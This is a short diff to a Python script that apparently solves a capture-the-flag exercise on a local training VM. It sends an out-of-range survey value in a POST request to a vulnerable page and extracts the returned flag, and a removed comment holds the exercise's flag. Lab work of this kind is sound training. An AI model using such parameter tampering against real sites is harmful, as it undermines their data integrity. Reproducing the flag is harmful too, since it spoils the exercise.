@@ -1,9 +1,13 @@
+import os
+import re
 import requests
 
-url = "http://192.168.122.118/?page=survey"
+VM_IP = os.environ.get("VM_IP", "192.168.122.118")
+url = f"http://{VM_IP}/?page=survey"
 
-# multi part post
 r = requests.post(url, data={"sujet": "3", "valeur": 11})
-print(r.text)
-
-#The flag is 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa
+match = re.search(r"flag is ([a-f0-9]{64})", r.text, re.IGNORECASE)
+if match:
+    print(f"Flag: {match.group(1)}")
+else:
+    print("Flag not found in response")
